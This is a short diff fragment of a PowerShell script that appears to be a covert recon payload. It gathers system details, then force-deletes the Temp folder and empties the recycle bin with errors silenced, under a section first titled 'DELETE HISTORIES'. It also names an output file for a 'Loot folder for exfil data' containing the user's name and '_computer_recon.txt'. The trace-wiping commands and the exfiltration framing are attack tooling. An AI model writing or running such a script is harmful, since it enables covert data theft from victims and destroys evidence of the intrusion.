@@ -151,7 +151,7 @@ Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverV
 
 ######################################################################################################################################################################
 
-# DELETE HISTORIES
+# DELETE/ CLEAN UPS
 
 # Delete Contents of Temp Folder
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
@@ -169,4 +169,6 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 #Loot folder for exfil data
 $FileName = "$env:USERNAME-$(get-date -f 'M/d/yyyy h:mm tt')_computer_recon.txt"
+
+######################################################################################################################################################################
 
